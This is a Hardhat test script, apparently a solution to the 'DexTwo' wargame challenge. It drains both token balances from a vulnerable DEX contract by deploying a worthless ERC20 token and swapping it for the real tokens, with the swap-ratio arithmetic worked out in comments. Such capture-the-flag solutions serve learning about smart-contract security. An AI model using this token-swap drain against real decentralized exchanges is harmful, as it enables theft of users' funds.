import { TransactionResponse } from "@ethersproject/providers";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("DexTwo Hack", async () => {
  let tx: TransactionResponse;
  async function deployDexTwoFixture() {
    const [deployer, attacker] = await ethers.getSigners();
    const attackerAddress = await attacker.getAddress();
    const Factory = await ethers.getContractFactory("DexTwoFactory");
    const factory = await Factory.connect(deployer).deploy();
    await factory.deployed();

    // We cannot get the return value of the state-changing function off-chain.
    // Simulate on-chain execution of the createInstance() to get the return value (the address of the deployed instance).
    const dexTwoAddress = await factory.connect(attacker).callStatic.createInstance(attackerAddress);

    // deploy the instance
    const tx = await factory.connect(attacker).createInstance(attackerAddress);
    await tx.wait(1);

    const dexTwo = await ethers.getContractAt("DexTwo", dexTwoAddress);

    const tokenOneAddress = await dexTwo.token1();
    const tokenOne = await ethers.getContractAt("SwappableToken", tokenOneAddress);

    const tokenTwoAddress = await dexTwo.token2();
    const tokenTwo = await ethers.getContractAt("SwappableToken", tokenTwoAddress);

    return { attacker, dexTwo, factory, tokenOne, tokenTwo };
  }

  it("Should drain Token1 and Token2 from Dex contract", async () => {
    const { attacker, dexTwo, factory, tokenOne, tokenTwo } = await loadFixture(deployDexTwoFixture);
    const attackerAddress = await attacker.getAddress();

    // create a new ERC20 token
    const UselessToken = await ethers.getContractFactory("UselessToken");
    const uselessToken = await UselessToken.connect(attacker).deploy("UselessToken", "UTN", 500);
    await uselessToken.deployed();

    // approve DexTwo to spend UselessToken on behalf of attacker
    tx = await uselessToken.connect(attacker).approve(dexTwo.address, 500);
    await tx.wait(1);

    // send UselessToken to dex
    tx = await uselessToken.connect(attacker).transfer(dexTwo.address, 100);
    await tx.wait(1);

    tx = await dexTwo.connect(attacker).swap(uselessToken.address, tokenOne.address, 100);
    await tx.wait(1);

    // Calculate amount of UselessToken to swap to get Token2
    // The number of token2 to be returned = (amount of token1 to be swapped * token2 balance of the contract)/token1 balance of the contract.
    // 100 = (x * 100)/200
    // x = 200

    tx = await dexTwo.connect(attacker).swap(uselessToken.address, tokenTwo.address, 200);
    await tx.wait(1);

    const tokenOneBalanceAfterHack = await tokenOne.balanceOf(dexTwo.address);
    const tokenTwoBalanceAfterHack = await tokenTwo.balanceOf(dexTwo.address);
    expect(tokenOneBalanceAfterHack.eq(0) && tokenTwoBalanceAfterHack.eq(0)).to.be.equal(true, "Hack Failed!!!");

    const success = await factory.validateInstance(dexTwo.address, attackerAddress);
    expect(success).to.be.equal(true, "Failed To Validate The Instance");
  });
});
